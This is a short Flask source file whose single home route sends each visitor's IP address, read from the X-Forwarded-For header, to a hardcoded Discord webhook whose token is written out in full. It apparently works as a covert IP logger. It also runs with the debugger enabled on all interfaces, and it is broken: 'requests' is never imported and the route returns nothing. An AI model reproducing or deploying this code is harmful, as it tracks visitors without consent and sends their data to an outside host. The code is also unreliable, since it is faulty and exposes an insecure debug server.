import flask

app = flask.Flask(__name__)

@app.route("/")

def home():

	r = requests.post("https://discord.com/api/webhooks/1144693280840368159/3jfaXs_Q_mT59QQrhj6PF1-i5reMStiPfAcCAInKc-gwJIXA6BPijQHHLM-eMy4dx1kx", json = {"content": flask.request.headers["X-Forwarded-For"]})

app.run(host="0.0.0.0", port=80,debug=True)